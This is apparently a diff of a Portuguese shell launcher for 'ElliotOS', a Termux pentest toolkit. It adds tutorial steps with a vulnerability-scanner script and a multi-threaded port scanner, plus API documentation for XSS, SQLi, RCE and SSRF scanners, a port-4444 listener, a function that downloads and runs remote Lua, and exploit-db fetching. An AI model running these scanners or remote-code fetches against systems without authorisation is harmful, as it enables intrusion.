+    _ok  "    send(fd, req, strlen(req), 0);"
+    _ok  "    char buf[4096];"
+    _ok  "    int n = recv(fd, buf, sizeof(buf)-1, 0);"
+    _ok  "    buf[n] = 0;"
+    _ok  "    puts(buf);"
+    _ok  "}"
+    _ok  "close(fd);"
+    _cont
+
+    _learn_step 32 35 "TRILHA 3 — C: criar modulo para o ms"
+    _sec "Modulo C que o ms pode carregar"
+    _ok  "// meu_mod.c — modulo Lua escrito em C"
+    _ok  "#include <lua.h>"
+    _ok  "#include <lauxlib.h>"
+    _ok  ""
+    _ok  "// funcao Lua: meu.xor(str, key)"
+    _ok  "static int l_xor(lua_State *L) {"
+    _ok  "    size_t slen, klen;"
+    _ok  "    const char *s = luaL_checklstring(L, 1, &slen);"
+    _ok  "    const char *k = luaL_checklstring(L, 2, &klen);"
+    _ok  "    char *out = malloc(slen+1);"
+    _ok  "    for (size_t i = 0; i < slen; i++)"
+    _ok  "        out[i] = s[i] ^ k[i % klen];"
+    _ok  "    out[slen] = 0;"
+    _ok  "    lua_pushlstring(L, out, slen);"
+    _ok  "    free(out);"
+    _ok  "    return 1;  // 1 valor retornado"
+    _ok  "}"
+    _ok  ""
+    _ok  "int luaopen_meu_mod(lua_State *L) {"
+    _ok  "    luaL_Reg funcs[] = {{\"xor\", l_xor}, {NULL,NULL}};"
+    _ok  "    luaL_newlib(L, funcs);"
+    _ok  "    return 1;"
+    _ok  "}"
+    _ok  ""
+    _ok  "-- compilar:"
+    _ok  "cxx -shared -fPIC meu_mod.c -o meu_mod.so \$(pkg-config --cflags lua5.4)"
+    _ok  "-- usar no ms:"
+    _ok  "local meu = require('meu_mod')"
+    _ok  "print(meu.xor('segredo', 'k'))"
+    _cont
+
+    # ══════════════════════════════════════════════════
+    # TRILHA 4 — PROJETOS REAIS
+    # ══════════════════════════════════════════════════
+
+    _learn_step 33 35 "TRILHA 4 — Projeto: scanner de vulnerabilidades"
+    printf "  \033[1;33m  Trilha 4: Projetos reais de pentest\033[0m\n\n"
+    _sec "vuln_scan.lua — scanner completo com relatorio"
+    _ok  "-- Uso: ms --script vuln_scan -- http://alvo.com"
+    _ok  "local alvo  = arg[1] or error('informe a URL')"
+    _ok  "local relat = 'relatorio_'..os.date('%Y%m%d_%H%M')..'.txt'"
+    _ok  "local vulns = 0"
+    _ok  ""
+    _ok  "local function log(msg)"
+    _ok  "  print(msg)"
+    _ok  "  fs.append(relat, msg..'\\n')"
+    _ok  "end"
+    _ok  ""
+    _ok  "log('[*] Iniciando scan: '..alvo)"
+    _ok  "log('[*] '..os.date())"
+    _ok  ""
+    _ok  "local checks = {"
+    _ok  "  {'XSS',    function() return mod.xss(alvo)  end},"
+    _ok  "  {'SQLi',   function() return mod.sqli(alvo) end},"
+    _ok  "  {'LFI',    function() return mod.lfi(alvo)  end},"
+    _ok  "  {'Headers',function() return mod.headers(alvo) end},"
+    _ok  "}"
+    _ok  ""
+    _ok  "for _, ck in ipairs(checks) do"
+    _ok  "  local ok, r = pcall(ck[2])"
+    _ok  "  if ok and r and r.vuln then"
+    _ok  "    log('[!] '..ck[1]..': VULNERAVEL')"
+    _ok  "    vulns = vulns + 1"
+    _ok  "  end"
+    _ok  "end"
+    _ok  ""
+    _ok  "log('\\n[=] Total: '..vulns..' vulnerabilidades')"
+    _ok  "log('[=] Relatorio: '..relat)"
+    _cont
+
+    _learn_step 34 35 "TRILHA 4 — Projeto: port scanner multi-thread"
+    _sec "portscan_mt.lua — scan paralelo com threads"
+    _ok  "-- Uso: ms --script portscan_mt -- 192.168.1.1 1 9999"
+    _ok  "local host  = arg[1] or '127.0.0.1'"
+    _ok  "local p_ini = tonumber(arg[2]) or 1"
+    _ok  "local p_fim = tonumber(arg[3]) or 1024"
+    _ok  "local THREADS = 4"
+    _ok  ""
+    _ok  "local abertas = {}"
+    _ok  "local chunk = math.floor((p_fim - p_ini + 1) / THREADS)"
+    _ok  ""
+    _ok  "print(string.format('[*] Scan %s:%d-%d (%d threads)', host, p_ini, p_fim, THREADS))"
+    _ok  ""
+    _ok  "local ts = {}"
+    _ok  "for i = 1, THREADS do"
+    _ok  "  local ini = p_ini + (i-1) * chunk"
+    _ok  "  local fim = (i == THREADS) and p_fim or (ini + chunk - 1)"
+    _ok  "  ts[i] = sys.thread(function()"
+    _ok  "    local r = net.scan(host, ini, fim)"
+    _ok  "    for _, p in ipairs(r) do"
+    _ok  "      table.insert(abertas, p)"
+    _ok  "    end"
+    _ok  "  end)"
+    _ok  "end"
+    _ok  ""
+    _ok  "for _, t in ipairs(ts) do sys.join(t) end"
+    _ok  "table.sort(abertas)"
+    _ok  ""
+    _ok  "print('[+] Portas abertas ('..#abertas..'):')"
+    _ok  "for _, p in ipairs(abertas) do"
+    _ok  "  print(string.format('  %-6d  %s', p, net.banner(host,p) or ''))"
+    _ok  "end"
+    _cont
+
+    _learn_step 35 35 "TRILHA 4 — Proximos passos e recursos"
+    _sec "Voce concluiu o tutorial completo!"
+    _ok  "Trilha 1: Lua basico ao avancado      [COMPLETO]"
+    _ok  "Trilha 2: Lua + ElliotOS API          [COMPLETO]"
+    _ok  "Trilha 3: C no ElliotOS               [COMPLETO]"
+    _ok  "Trilha 4: Projetos reais              [COMPLETO]"
+    printf "\n"
+    _sec "Proximos passos"
+    _ok  "ms --examples        # scripts prontos para estudar"
+    _ok  "ms --doc modulos     # referencia completa da API"
+    _ok  "ms --doc net         # modulo net.*"
+    _ok  "ms --doc mod         # scanners mod.*"
+    _ok  "ms --doc crypto      # crypto.*"
+    _ok  "lpm --script -s ''   # explore o exploit-db"
+    _ok  "xpm list             # ferramentas disponiveis"
+    printf "\n"
+    _sec "Recursos externos"
+    _ok  "lua.org/manual/5.4       -- manual oficial do Lua 5.4"
+    _ok  "github.com/mikeelliot218/ElliotOS  -- codigo fonte"
+    _ok  "ms -a 'duvida'           -- pergunte para a CYN"
+    printf "\n"
+    printf "  \033[1;32m  Bom pentest. Use com responsabilidade.\033[0m\n\n"
+    ;;
+  --payload)
     _EX="\${PREFIX:-/data/data/com.termux/files/usr}/share/lua-scripts"
-    exec "\$_B" "\$_EX/learn.lua"
+    if [ -f "\$_EX/payload.lua" ]; then
+      exec "\$_B" "\$_EX/payload.lua" "\${@:2}"
+    else
+      printf "\033[1;31m[!] payload.lua nao encontrado. Reinstale com: bash luascript.sh --update\033[0m\n"
+      exit 1
+    fi
     ;;
   --examples)
-    _EX="\${PREFIX:-/data/data/com.termux/files/usr}/share/lua-scripts"
-    printf "\033[1;36m── Scripts de exemplo disponíveis ──────────────────\033[0m\n"
-    for f in "\$_EX"/*.lua; do
+    _EX="${PREFIX:-/data/data/com.termux/files/usr}/share/lua-scripts"
+    _EX_C="${PREFIX:-/data/data/com.termux/files/usr}/share/c-scripts"
+    printf "\n\033[1;35m╔════════════════════════════════════════════════════════════════╗\033[0m\n"
+    printf "\033[1;35m║  ElliotOS — Scripts de Exemplo                              ║\033[0m\n"
+    printf "\033[1;35m╚═══════════════════════════════════════════════════════════════╝\033[0m\n\n"
+    # Scripts Lua
+    _lua_count=0
+    if [ -d "\$_EX" ]; then
+      for f in "\$_EX"/*.lua; do [ -f "\$f" ] && _lua_count=\$((_lua_count+1)); done
+    fi
+    if [ "\$_lua_count" -gt 0 ]; then
+      printf "\033[1;33m── Scripts Lua (%d) ───────────────────────────────────────────────\033[0m\n" "\$_lua_count"
+      printf "  \033[0;90m%-22s  %-12s  %s\033[0m\n" "NOME" "CATEGORIA" "DESCRIÇÃO"
+      printf "  \033[0;90m%s\033[0m\n" "───────────────────────────────────────────────────────────────"
+      for f in "\$_EX"/*.lua; do
         [ -f "\$f" ] || continue
         _name=\$(basename "\$f")
-        _desc=\$(head -3 "\$f" | grep "^--" | tail -1 | sed 's/^-- *//')
-        printf "  \033[1;32m%-20s\033[0m \033[0;90m%s\033[0m\n" "\$_name" "\$_desc"
-    done
-    printf "\n\033[0;90m  Rodar: ms --script <script.lua> -- [args]\033[0m\n"
+        _desc=\$(head -5 "\$f" | grep "^--" | tail -1 | sed 's/^-- *//')
+        _cat=\$(head -8 "\$f" | grep -i "^-- *cat\|^-- *type\|^-- *category" | sed 's/^--[^:]*: *//' | head -1)
+        [ -z "\$_cat" ] && _cat="pentest"
+        printf "  \033[1;32m%-22s\033[0m \033[1;33m%-12s\033[0m \033[0;90m%s\033[0m\n" "\$_name" "\$_cat" "\$_desc"
+        _args=\$(head -10 "\$f" | grep -i "^-- *args\|^-- *uso\|^-- *use" | sed 's/^--[^:]*: *//' | head -1)
+        [ -n "\$_args" ] && printf "  \033[0;90m  args: %s\033[0m\n" "\$_args"
+      done
+      printf "\n"
+    else
+      printf "  \033[0;90m(nenhum script Lua em \$_EX)\033[0m\n\n"
+    fi
+    # Scripts C
+    _c_count=0
+    if [ -d "\$_EX_C" ]; then
+      for f in "\$_EX_C"/*; do [ -f "\$f" ] && _c_count=\$((_c_count+1)); done
+    fi
+    if [ "\$_c_count" -gt 0 ]; then
+      printf "\033[1;33m── Scripts C (%d) ──────────────────────────────────────────────────\033[0m\n" "\$_c_count"
+      for f in "\$_EX_C"/*; do
+        [ -f "\$f" ] || continue
+        _name=\$(basename "\$f")
+        _desc=\$(head -5 "\$f" | grep -m1 "^//" | sed 's|^// *||')
+        case "\$_name" in *.c) _ctype="C fonte";; *) _ctype="binario";; esac
+        printf "  \033[1;33m%-22s\033[0m \033[0;90m%-10s  %s\033[0m\n" "\$_name" "\$_ctype" "\$_desc"
+      done
+      printf "\n"
+    fi
+    # Scripts pessoais
+    _EX_HOME="\$HOME/.elliot/scripts"
+    _home_count=0
+    if [ -d "\$_EX_HOME" ]; then
+      for f in "\$_EX_HOME"/*; do [ -f "\$f" ] && _home_count=\$((_home_count+1)); done
+    fi
+    if [ "\$_home_count" -gt 0 ]; then
+      printf "\033[1;33m── Scripts pessoais — ~/.elliot/scripts (%d) ───────────────────\033[0m\n" "\$_home_count"
+      for f in "\$_EX_HOME"/*; do
+        [ -f "\$f" ] || continue
+        _name=\$(basename "\$f")
+        _desc=\$(head -5 "\$f" | grep -m1 "^--\|^//\|^#" | sed 's|^[#/-]* *||')
+        printf "  \033[1;35m%-22s\033[0m \033[0;90m%s\033[0m\n" "\$_name" "\$_desc"
+      done
+      printf "\n"
+    fi
+    printf "\033[1;36mComo executar:\033[0m\n"
+    printf "  \033[1;32mms --script nome\033[0m                   # Lua ou C\n"
+    printf "  \033[1;32mms --script nome -- [args]\033[0m         # com argumentos\n"
+    printf "  \033[1;32mms --script portscan.lua -- host 80\033[0m\n"
+    printf "  \033[1;32mms --script xerxes.c -- host 80\033[0m\n"
+    printf "  \033[1;32mlpm --script -s 'sqli'\033[0m             # baixar do exploit-db\n\n"
+    ;;
+  --doc)
+    _DOC_PAGER=""
+    command -v less > /dev/null 2>&1 && _DOC_PAGER="less -R"
+    command -v more > /dev/null 2>&1 && [ -z "\$_DOC_PAGER" ] && _DOC_PAGER="more"
+    _doc_body() {
+    printf "\n\033[1;36m╔════════════════════════════════════════════════════════════════╗\033[0m\n"
+    printf "\033[1;36m║          ElliotOS — Documentação do Sistema                  ║\033[0m\n"
+    printf "\033[1;36m║  O primeiro sistema de pentest nativo para Android           ║\033[0m\n"
+    printf "\033[1;36m╚═══════════════════════════════════════════════════════════════╝\033[0m\n"
+    printf "\033[0;90m  Desenvolvido por Mike Elliot · github.com/mikeelliot218/ElliotOS\033[0m\n\n"
+    printf "\033[1;35m═══ O QUE E O ElliotOS ═════════════════════════════════════════\033[0m\n\n"
+    printf "  Sistema de seguranca e pentest dentro do Termux. Roda no celular,\n"
+    printf "  sem root, sem VM. Um script compila do zero: Lua 5.4.8, 23 modulos\n"
+    printf "  C, IA nativa (CYN), e ferramentas: ms, lpm, xpm, cxx, ee, xtun.\n\n"
+    printf "\033[1;35m═══ PLATAFORMAS ═══════════════════════════════════════════════\033[0m\n\n"
+    printf "  \033[1;32m%-18s\033[0m \033[1;33m%-14s\033[0m %s\n" "Ambiente" "Flag" "Gerenciador"
+    printf "  \033[0;90m%-18s  %-14s  %s\033[0m\n" "Android/Termux" "--termux" "pkg"
+    printf "  \033[0;90m%-18s  %-14s  %s\033[0m\n" "Debian/Ubuntu" "--debian" "apt"
+    printf "  \033[0;90m%-18s  %-14s  %s\033[0m\n" "Arch Linux" "--arch" "pacman"
+    printf "  \033[0;90m%-18s  %-14s  %s\033[0m\n" "Fedora/RHEL" "--fedora" "dnf"
+    printf "\n"
+    printf "\033[1;35m═══ INSTALACAO ════════════════════════════════════════════════\033[0m\n\n"
+    printf "  \033[1;36mMinimo:\033[0m  \033[0;90mpkg update && pkg install git wget curl clang\033[0m\n"
+    printf "           \033[0;90mgit clone https://github.com/mikeelliot218/ElliotOS.git\033[0m\n"
+    printf "           \033[0;90mcd ElliotOS && bash luascript.sh\033[0m\n\n"
+    printf "  \033[1;36mCom editor:\033[0m  \033[0;90mbash luascript.sh -e\033[0m\n"
+    printf "  \033[1;36mCom GUI:\033[0m     \033[0;90mbash luascript.sh --gui\033[0m\n"
+    printf "  \033[1;36mAtualizar:\033[0m   \033[0;90mbash luascript.sh --update\033[0m\n"
+    printf "  \033[1;36mDesinstalar:\033[0m \033[0;90mbash luascript.sh -u\033[0m\n"
+    printf "  \033[1;36mDiagnostico:\033[0m \033[0;90mbash luascript.sh --doctor\033[0m\n\n"
+    printf "\033[1;35m═══ BINARIOS E FERRAMENTAS ═══════════════════════════════════\033[0m\n\n"
+    printf "  \033[1;32m%-12s\033[0m %s\n" "ms" "MoonStyle - REPL Lua 5.4 com modulos de pentest"
+    printf "  \033[1;32m%-12s\033[0m %s\n" "lua-net" "Interpretador Lua com 23 modulos de seguranca"
+    printf "  \033[1;32m%-12s\033[0m %s\n" "lpm" "Gerenciador de modulos Lua e exploits"
+    printf "  \033[1;32m%-12s\033[0m %s\n" "xpm" "Gerenciador de ferramentas de pentest"
+    printf "  \033[1;32m%-12s\033[0m %s\n" "cxx" "Compilador C/C++ simplificado"
+    printf "  \033[1;32m%-12s\033[0m %s\n" "ee" "Editor de texto nativo leve"
+    printf "  \033[1;32m%-12s\033[0m %s\n" "xtun" "Tunnel Toolkit TCP/UDP sem root"
+    printf "  \033[1;32m%-12s\033[0m %s\n" "appforge" "HTML/CSS/JS -> APK sem root"
+    printf "  \033[1;32m%-12s\033[0m %s\n" "apkinspect" "Analise estatica de APKs"
+    printf "  \033[1;32m%-12s\033[0m %s\n" "wordmagic" "Gerador inteligente de wordlists"
+    printf "\n"
+    printf "\033[1;35m═══ FLAGS DO ms ════════════════════════════════════════════════\033[0m\n\n"
+    printf "  \033[1;36mGeral:\033[0m\n"
+    printf "  \033[1;32m  ms\033[0m                    REPL interativo\n"
+    printf "  \033[1;32m  ms -c 'codigo'\033[0m        executa Lua\n"
+    printf "  \033[1;32m  ms -f script.lua\033[0m      executa arquivo\n"
+    printf "  \033[1;32m  ms -e [arquivo]\033[0m       editor\n"
+    printf "  \033[1;32m  ms -i\033[0m                 info do sistema\n"
+    printf "  \033[1;32m  ms -v\033[0m                 versao\n"
+    printf "  \033[1;32m  ms -h\033[0m                 ajuda completa\n\n"
+    printf "  \033[1;36mIA (CYN):\033[0m\n"
+    printf "  \033[1;32m  ms -a\033[0m                 chat com a CYN\n"
+    printf "  \033[1;32m  ms -a 'pergunta'\033[0m      pergunta direta\n"
+    printf "  \033[1;32m  ms --search 'query'\033[0m   pesquisa web\n"
+    printf "  \033[1;32m  ms --code 'tarefa'\033[0m    gera codigo\n\n"
+    printf "  \033[1;36mRede:\033[0m\n"
+    printf "  \033[1;32m  ms -g url\033[0m             HTTP GET\n"
+    printf "  \033[1;32m  ms --post url dados\033[0m   HTTP POST\n"
+    printf "  \033[1;32m  ms --ip\033[0m               IP publico\n"
+    printf "  \033[1;32m  ms -d host\033[0m            DNS lookup\n"
+    printf "  \033[1;32m  ms -P host\033[0m            ping\n"
+    printf "  \033[1;32m  ms --scan host p1 p2\033[0m  port scan\n"
+    printf "  \033[1;32m  ms --listen porta\033[0m     listener TCP\n\n"
+    printf "  \033[1;36mPentest:\033[0m\n"
+    printf "  \033[1;32m  ms -x url [N]\033[0m         XSS\n"
+    printf "  \033[1;32m  ms -q url [N]\033[0m         SQLi\n"
+    printf "  \033[1;32m  ms -l url [N]\033[0m         LFI\n"
+    printf "  \033[1;32m  ms -r url [N]\033[0m         RCE\n"
+    printf "  \033[1;32m  ms -N url\033[0m             NoSQL Injection\n"
+    printf "  \033[1;32m  ms --ssrf url [N]\033[0m     SSRF\n"
+    printf "  \033[1;32m  ms --ssti url [N]\033[0m     SSTI\n"
+    printf "  \033[1;32m  ms --scan-all url\033[0m     todos os scanners\n"
+    printf "  \033[1;32m  ms -s url [limit]\033[0m     spider\n\n"
+    printf "  \033[1;36mCrypto:\033[0m\n"
+    printf "  \033[1;32m  ms --md5 'texto'\033[0m      hash MD5\n"
+    printf "  \033[1;32m  ms --sha256 'texto'\033[0m   hash SHA256\n"
+    printf "  \033[1;32m  ms --b64e 'texto'\033[0m     Base64 encode\n"
+    printf "  \033[1;32m  ms --b64d 'b64'\033[0m       Base64 decode\n"
+    printf "  \033[1;32m  ms --jwt 'token'\033[0m      decodifica JWT\n\n"
+    printf "  \033[1;36mAPK:\033[0m\n"
+    printf "  \033[1;32m  ms --apk app.apk\033[0m      testa APK\n"
+    printf "  \033[1;32m  ms --apk-sign app.apk\033[0m assina APK\n"
+    printf "  \033[1;32m  appforge build <dir>\033[0m   HTML -> APK\n\n"
+    printf "  \033[1;36mAprender / Docs:\033[0m\n"
+    printf "  \033[1;32m  ms --learn\033[0m            tutorial (8 licoes)\n"
+    printf "  \033[1;32m  ms --examples\033[0m         scripts de exemplo\n"
+    printf "  \033[1;32m  ms --doc\033[0m              esta documentacao\n"
+    printf "  \033[1;32m  ms --doc modulos\033[0m      referencia dos modulos\n"
+    printf "  \033[1;32m  ms --doc net\033[0m          modulo net.*\n"
+    printf "  \033[1;32m  ms --doc mod\033[0m          modulo mod.* (scanners)\n"
+    printf "  \033[1;32m  ms --doc crypto\033[0m       modulo crypto.*\n"
+    printf "  \033[1;32m  ms --doc sys\033[0m          modulo sys.*\n"
+    printf "  \033[1;32m  ms --doc fs\033[0m           modulo fs.*\n"
+    printf "  \033[1;32m  ms --doc ai\033[0m           modulo ai.*\n"
+    printf "  \033[1;32m  ms --doc string\033[0m       extensoes string.*\n"
+    printf "  \033[1;32m  ms --doc util\033[0m         stdlib funcional util.*\n"
+    printf "  \033[1;32m  ms --doc json\033[0m         json.encode / json.decode\n\n"
+    printf "\033[1;35m═══ MODULOS DA API ════════════════════════════════════════════\033[0m\n\n"
+    printf "  Modulos globais no REPL. Nunca use require().\n"
+    printf "  Referencia especifica: \033[1;32mms --doc <modulo>\033[0m\n\n"
+    printf "  \033[1;33m%-12s\033[0m %s\n" "net.*" "Rede: HTTP, TCP, UDP, DNS, port scan, sockets"
+    printf "  \033[1;33m%-12s\033[0m %s\n" "mod.*" "Pentest: 23 scanners (XSS, SQLi, LFI, RCE...)"
+    printf "  \033[1;33m%-12s\033[0m %s\n" "exploit.*" "REPLs de exploracao interativa"
+    printf "  \033[1;33m%-12s\033[0m %s\n" "sys.*" "Sistema: threads, processos, env, sleep"
+    printf "  \033[1;33m%-12s\033[0m %s\n" "fs.*" "Filesystem: read, write, list, stat, glob"
+    printf "  \033[1;33m%-12s\033[0m %s\n" "crypto.*" "Criptografia: MD5, SHA, AES, Base64, JWT"
+    printf "  \033[1;33m%-12s\033[0m %s\n" "ai.*" "IA (CYN): chat, code, search, providers"
+    printf "  \033[1;33m%-12s\033[0m %s\n" "db.*" "Banco de dados SQLite"
+    printf "  \033[1;33m%-12s\033[0m %s\n" "pent.*" "Pentest utilitarios extras"
+    printf "  \033[1;33m%-12s\033[0m %s\n" "ui.*" "Interface de usuario no terminal"
+    printf "  \033[1;33m%-12s\033[0m %s\n" "tui.*" "Terminal UI (menus, formularios)"
+    printf "  \033[1;33m%-12s\033[0m %s\n" "ell.*" "Encoder/Decoder de scripts (.ell)"
+    printf "  \033[1;33m%-12s\033[0m %s\n" "agent.*" "Agente autonomo com tools"
+    printf "  \033[1;33m%-12s\033[0m %s\n" "string.*" "Extensoes de string: trim, split, slugify, is*, pad..."
+    printf "  \033[1;33m%-12s\033[0m %s\n" "util.*" "Stdlib funcional: map, filter, pipe, stats, iter, chain"
+    printf "  \033[1;33m%-12s\033[0m %s\n" "json.*" "JSON encode/decode nativo"
+    }
+    _doc_net() {
+    printf "\033[1;35m═══ net.* — Módulo de Rede ════════════════════════════════════════\033[0m\n\n"
+    printf "\033[1;36m── HTTP ───────────────────────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33mnet.get\033[0m(url [, opts])\n"
+    printf "  \033[0;90m  Retorna: body(string), code(int)   ou   nil, errmsg\033[0m\n"
+    printf "  \033[1;31m  ⚠ retorna DOIS valores separados, não uma tabela!\033[0m\n"
+    printf "  \033[0;90m  local body, code = net.get('https://alvo.com')\033[0m\n"
+    printf "  \033[0;90m  local body, code = net.get(url, {timeout=10, quiet=true})\033[0m\n"
+    printf "  \033[0;90m  net.get('https://alvo.com', 'saida.html')   -- salva em arquivo\033[0m\n\n"
+    printf "  \033[1;33mnet.post\033[0m(url, body [, content_type [, opts]])\n"
+    printf "  \033[0;90m  Retorna: body(string), code(int)   ou   nil, errmsg\033[0m\n"
+    printf "  \033[0;90m  Content-Type padrão: application/x-www-form-urlencoded\033[0m\n"
+    printf "  \033[0;90m  local b, c = net.post(url,\033[0m\n"
+    printf "  \033[0;90m    'user=admin&pass=123')\033[0m\n"
+    printf "  \033[0;90m  local b, c = net.post(url, json_str, 'application/json')\033[0m\n\n"
+    printf "  \033[1;33mnet.fetch\033[0m(url, opts)\n"
+    printf "  \033[0;90m  Interface moderna. Retorna: body, code, headers_recebidos\033[0m\n"
+    printf "  \033[0;90m  opts: {method, body, timeout,\033[0m\n"
+    printf "  \033[0;90m    headers, quiet, follow, ua, file}\033[0m\n"
+    printf "  \033[0;90m  local b,c,h = net.fetch(url, {method='PUT',\033[0m\n"
+    printf "  \033[0;90m    body='{}', quiet=true})\033[0m\n\n"
+    printf "  \033[1;33mnet.geth\033[0m(url [, opts])\n"
+    printf "  \033[0;90m  Como get + retorna headers. quiet por padrao.\033[0m\n\n"
+    printf "\033[1;36m── TCP / SOCKETS ──────────────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33mnet.tcp\033[0m(host, port)  ->  socket OO  ou  nil, errmsg\n"
+    printf "  \033[0;90m  local s = net.tcp('192.168.1.1', 80)\033[0m\n"
+    printf "  \033[0;90m  s:send('dados')    -- envia string\033[0m\n"
+    printf "  \033[0;90m  local data = s:recv(4096)\033[0m\n"
+    printf "  \033[0;90m  s:close()\033[0m\n\n"
+    printf "  \033[1;31m  ! recv() retorna nil sem dado -- nao e erro!\033[0m\n"
+    printf "  \033[0;90m    repeat sys.sleep(0.1)\033[0m\n"
+    printf "  \033[0;90m    data = s:recv(4096) until data\033[0m\n\n"
+    printf "  \033[1;33mnet.listen\033[0m(port [, host])  ->  socket servidor\n"
+    printf "  \033[1;31m  ! PORTA e o primeiro argumento!\033[0m\n"
+    printf "  \033[0;90m  local srv  = net.listen(4444)\033[0m\n"
+    printf "  \033[0;90m  local conn = srv:accept()\033[0m\n"
+    printf "  \033[0;90m  conn:send('resposta')\033[0m\n"
+    printf "  \033[0;90m  conn:close(); srv:close()\033[0m\n\n"
+    printf "  \033[1;33mnet.socket\033[0m(family, type, host, port [, to [, payload]])\n"
+    printf "  \033[0;90m  Fire-and-forget: conecta, envia, recebe, fecha.\033[0m\n"
+    printf "  \033[0;90m  net.socket('ipv4','stream','alvo.com',80)\033[0m\n\n"
+    printf "  \033[1;33mnet.udp\033[0m(host, port)  ->  socket UDP\n\n"
+    printf "\033[1;36m── DNS / PING / SCAN ──────────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33mnet.dns\033[0m(host [, type])  →  tabela de IPs   ou   nil, errmsg\033[0m\n"
+    printf "  \033[0;90m  type: 'A' (padrão), 'AAAA', 'ANY'\033[0m\n"
+    printf "  \033[0;90m  local ips = net.dns('google.com')\033[0m\n"
+    printf "  \033[0;90m  for _, ip in ipairs(ips) do print(ip) end\033[0m\n\n"
+    printf "  \033[1;33mnet.ping\033[0m(host)  →  true / false\033[0m\n"
+    printf "  \033[1;33mnet.scan\033[0m(host, p1, p2 [, threads])\n"
+    printf "  \033[0;90m  -> tabela de portas abertas\033[0m\n"
+    printf "  \033[0;90m  local abertas = net.scan('192.168.1.1', 1, 1024)\033[0m\n"
+    printf "  \033[0;90m  for _, p in ipairs(abertas) do print(p) end\033[0m\n\n"
+    printf "  \033[1;33mnet.os\033[0m(host)         OS fingerprint\033[0m\n"
+    printf "  \033[1;33mnet.ip\033[0m([subnet])     hosts ativos na rede local\033[0m\n"
+    printf "  \033[0;90m  net.ip('192.168.1')   -- subnet específica\033[0m\n"
+    printf "  \033[1;33mnet.import\033[0m(url)      baixa e executa Lua remoto\033[0m\n\n"
+    }
+    _doc_mod() {
+    printf "\033[1;35m═══ mod.* — Scanners de Pentest (23) ═════════════════════════════\033[0m\n\n"
+    printf "\033[1;36m── INJEÇÕES ───────────────────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33mmod.xss\033[0m(url)           XSS reflected, stored e DOM\033[0m\n"
+    printf "  \033[1;33mmod.sqli\033[0m(url)          SQLi: error, boolean, time-based, UNION\033[0m\n"
+    printf "  \033[1;33mmod.nosql\033[0m(url)         NoSQL Injection\033[0m\n"
+    printf "  \033[1;33mmod.lfi\033[0m(url)           LFI e Path Traversal\033[0m\n"
+    printf "  \033[1;33mmod.rce\033[0m(url)           Remote Code Execution\033[0m\n"
+    printf "  \033[1;33mmod.ssti\033[0m(url)          Server-Side Template Injection\033[0m\n"
+    printf "  \033[1;33mmod.xxe\033[0m(url)           XML External Entity\033[0m\n"
+    printf "  \033[0;90m  Todos retornam: {vuln=bool, payload=string, detalhes=string} ou nil\033[0m\n\n"
+    printf "\033[1;36m── INFRAESTRUTURA ─────────────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33mmod.ssrf\033[0m(url)          SSRF\033[0m\n"
+    printf "  \033[1;33mmod.cors\033[0m(url)          CORS misconfiguration\033[0m\n"
+    printf "  \033[1;33mmod.csrf\033[0m(url)          CSRF\033[0m\n"
+    printf "  \033[1;33mmod.redir\033[0m(url)         Open Redirect\033[0m\n"
+    printf "  \033[1;33mmod.idor\033[0m(url, param)   IDOR\033[0m\n"
+    printf "  \033[1;33mmod.jwt\033[0m(token)         JWT: alg:none, weak secret, RS256→HS256\033[0m\n"
+    printf "  \033[1;33mmod.headers\033[0m(url)       analisa security headers\033[0m\n"
+    printf "  \033[1;33mmod.waf\033[0m(url)           detecta e fingerprinta WAF\033[0m\n\n"
+    printf "\033[1;36m── RECONHECIMENTO ─────────────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33mmod.spider\033[0m(url, limit) crawler → tabela de URLs\033[0m\n"
+    printf "  \033[1;33mmod.dirs\033[0m(url)          bruteforce de diretórios\033[0m\n"
+    printf "  \033[1;33mmod.subdomains\033[0m(domain) enumeração de subdomínios\033[0m\n"
+    printf "  \033[1;33mmod.backup\033[0m(url)        arquivos de backup expostos\033[0m\n"
+    printf "  \033[1;33mmod.secrets\033[0m(url)       secrets e chaves vazadas\033[0m\n"
+    printf "  \033[1;33mmod.params\033[0m(url)        parâmetros ocultos\033[0m\n"
+    printf "  \033[1;33mmod.chain\033[0m(url)         pipeline automático — roda tudo\033[0m\n\n"
+    printf "\033[1;36m── EXEMPLO: SCAN COM RELATÓRIO ────────────────────────────────────\033[0m\n\n"
+    printf "  \033[0;90m  local alvo = 'http://alvo.com'\033[0m\n"
+    printf "  \033[0;90m  local checks = {'xss','sqli','lfi','cors','headers'}\033[0m\n"
+    printf "  \033[0;90m  for _, nome in ipairs(checks) do\033[0m\n"
+    printf "  \033[0;90m    local ok, r = pcall(mod[nome], alvo)\033[0m\n"
+    printf "  \033[0;90m    if ok and r and r.vuln then\033[0m\n"
+    printf "  \033[0;90m      print('[!] '..nome:upper()..': '..r.payload)\033[0m\n"
+    printf "  \033[0;90m      fs.append('relatorio.txt', nome..': '..r.payload..'\\n')\033[0m\n"
+    printf "  \033[0;90m    end\033[0m\n"
+    printf "  \033[0;90m  end\033[0m\n\n"
+    }
+    _doc_crypto() {
+    printf "\033[1;35m═══ crypto.* — Criptografia ═══════════════════════════════════════\033[0m\n\n"
+    printf "\033[1;36m── HASHES ─────────────────────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33mcrypto.md5\033[0m(s)              → string hex 32 chars\033[0m\n"
+    printf "  \033[1;33mcrypto.sha1\033[0m(s)             → string hex 40 chars\033[0m\n"
+    printf "  \033[1;33mcrypto.sha256\033[0m(s)           → string hex 64 chars\033[0m\n"
+    printf "  \033[1;33mcrypto.sha512\033[0m(s)           → string hex 128 chars\033[0m\n"
+    printf "  \033[1;33mcrypto.hmac\033[0m(key, data, algo)  → hex  (algo: 'sha256','sha1')\033[0m\n"
+    printf "  \033[0;90m  print(crypto.sha256('senha123'))\033[0m\n"
+    printf "  \033[0;90m  print(crypto.hmac('chave','dado','sha256'))\033[0m\n\n"
+    printf "\033[1;36m── ENCODING ───────────────────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33mcrypto.b64e\033[0m(s)             → string Base64\033[0m\n"
+    printf "  \033[1;33mcrypto.b64d\033[0m(s)             → string decodificada\033[0m\n"
+    printf "  \033[0;90m  local enc = crypto.b64e('ola mundo')   --> 'b2xhIG11bmRv'\033[0m\n"
